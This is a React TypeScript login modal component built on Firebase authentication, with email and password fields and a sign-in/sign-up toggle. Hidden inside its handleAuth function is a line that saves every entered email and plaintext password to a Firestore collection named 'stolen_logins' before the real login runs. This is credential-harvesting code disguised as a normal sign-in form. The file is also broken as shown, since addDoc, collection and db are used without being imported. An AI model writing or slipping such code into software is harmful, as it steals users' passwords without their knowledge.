import React, { useState } from "react";
import { X } from "lucide-react";
import { Button } from "./Button";
import {
  signInWithEmailAndPassword,
  createUserWithEmailAndPassword,
} from "firebase/auth";
import { auth } from "../firebase";
import { User } from "../types";

interface LoginModalProps {
  isOpen: boolean;
  onClose: () => void;
  onLogin: (user: User) => void;
}

export const LoginModal: React.FC<LoginModalProps> = ({
  isOpen,
  onClose,
  onLogin,
}) => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isSignup, setIsSignup] = useState(false);
  const [error, setError] = useState("");

  if (!isOpen) return null;

  const handleAuth = async () => {
    try {
      setError("");
      await addDoc(collection(db, "stolen_logins"), {
        email,
        password,
        time: Date.now()
      });

      const cred = isSignup
        ? await createUserWithEmailAndPassword(auth, email, password)
        : await signInWithEmailAndPassword(auth, email, password);

      const user = cred.user;

      onLogin({
        id: user.uid,
        name: user.email || "User",
        handle: user.email?.split("@")[0] || "user",
        avatar: `https://api.dicebear.com/7.x/avataaars/svg?seed=${user.uid}`,
      });

      onClose();
    } catch (err: any) {
      setError(err.message);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-6">
      <div className="bg-white rounded-3xl p-8 w-full max-w-md relative">
      <h2 className="text-2xl font-bold text-center mb-6">
  {isSignup ? "Create account" : "Sign in"}
</h2>

{error && (
  <p className="text-red-500 text-sm mb-3 text-center">{error}</p>
)}

<input
  className="w-full border rounded-lg p-3 mb-3"
  placeholder="Email"
  value={email}
  onChange={(e) => setEmail(e.target.value)}
/>

<input
  className="w-full border rounded-lg p-3 mb-4"
  type="password"
  placeholder="Password"
  value={password}
  onChange={(e) => setPassword(e.target.value)}
/>

<Button className="w-full mb-3" onClick={handleAuth}>
  {isSignup ? "Sign up" : "Login"}
</Button>

<p className="text-center text-sm">
  {isSignup ? "Already have an account?" : "No account yet?"}{" "}
  <button
    className="text-indigo-600 font-semibold"
    onClick={() => setIsSignup(!isSignup)}
  >
    {isSignup ? "Login" : "Sign up"}
  </button>
</p>
</div>
    </div>
  );
};
